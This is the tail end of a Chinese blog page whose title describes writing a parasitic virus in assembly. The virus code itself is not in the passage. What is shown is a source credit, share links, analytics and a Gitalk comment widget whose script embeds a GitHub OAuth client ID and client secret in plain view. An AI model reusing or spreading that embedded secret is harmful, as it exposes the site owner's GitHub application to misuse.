 </code></pre></div></div> <p>参考自瑟凡老师的<a href="http://www.boobooke.com/m/s211.html">瑟凡计算机病毒系列</a></p> <p><span class="site-footer-credits">版权所有，转载请注明出处 <a href="https://luowei.github.io/list">luowei.github.io</a>.</span></p> <link rel="stylesheet" href="/list/assets/css/font-awesome.min.css?ver=20151122" /> <!--[if IE 7 ]><link rel="stylesheet" href="/list/assets/css/font-awesome-ie7.min.css?ver=20151122"><![endif]--> <div style="float: right"> <span id="share"> <a class="wechat" target="_blank" title="分享到微信" href="https://chart.apis.google.com/chart?cht=qr&amp;chs=300x300&amp;chl=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html"><i class="icon-large icon-wechat"></i></a> <a class="weibo" target="_blank" title="分享到微博" href="http://service.weibo.com/share/share.php?title=ASM-用汇编写一个尾寄生Virus - 知不知&amp;url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html&amp;type=3&amp;searchPic=1"><i class="icon-large icon-weibo"></i></a> <a class="qzone" target="_blank" title="分享到 QQ 空间" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html&amp;title=ASM-用汇编写一个尾寄生Virus - 知不知&amp;summary=用汇编写一个尾寄生Virus&amp;site=/list"><i class="icon-large icon-qzone"></i></a> <a class="twitter" target="_blank" title="Share to Twitter" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html&amp;text=ASM-用汇编写一个尾寄生Virus - 知不知&amp;via=luowei010101"><i class="icon-large icon-twitter"></i></a> <a class="facebook" target="_blank" title="Share to Facebook" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html&amp;t=ASM-用汇编写一个尾寄生Virus - 知不知"><i class="icon-large icon-facebook-sign"></i></a> <a class="googleplus" target="_blank" title="Share to Google+" href="https://plus.google.com/share?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E5%25B0%25BE%25E5%25AF%2584%25E7%2594%259FVirus.html"><i class="icon-large icon-google-plus-sign"></i></a> </span> </div> <hr /> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" /> <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> <div id="gitalk-container"></div> <script type="text/javascript"> var gitalk = new Gitalk({ clientID: '9d5ee666269c252cf949', clientSecret: '728cd598f1fca9d8c1df1dfa300057883a3a8676', repo: 'list', owner: 'luowei', admin: ['luowei'], id: decodeURI('ASM-用汇编写一个尾寄生Virus'), distractionFreeMode: false }); gitalk.render('gitalk-container'); </script> <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1277627361'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s96.cnzz.com/z_stat.php%3Fid%3D1277627361%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));</script> <footer class="site-footer"> <span class="site-footer-owner"><a href="https://luowei.github.io/list">知不知</a> is maintained by <a href="http://luowei.github.io/list">luowei</a>.</span> <span class="site-footer-credits">Developed by <a href="https://luowei.github.io/list">luowei</a>.</span> </footer> </section> </body> </html>
